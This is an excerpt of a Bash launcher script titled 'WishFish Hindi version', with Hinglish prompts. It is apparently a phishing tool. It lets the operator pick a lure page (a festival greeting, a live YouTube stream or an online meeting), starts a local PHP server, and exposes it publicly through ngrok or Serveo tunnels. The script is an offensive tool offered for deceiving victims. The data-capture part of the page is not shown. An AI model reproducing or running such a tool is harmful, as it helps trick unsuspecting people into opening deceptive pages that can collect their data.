...
printf " \e[1;93m WishFish Hindi version \e[0m \n"
...
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Serveo start ho raha hai ...\e[0m\n"
...
printf "\n[Template Select karo  ]n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing kay liya \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV kay liya \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting kay liya \e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] festival ka name dal : \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] YouTube video watch ID enter kar: \e[0m' yt_video_ID
...
printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok download ho raha hai...\n"
...
printf "\e[1;93m[!] Download mai dikat... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
...
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m kar diya cahange \n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] valid ngrok authtoken dal: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi
printf "\e[1;92m[\e[0m+\e[1;92m] php server start ho raha wait karo...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] ngrok server start ho raha wait kar...\n"
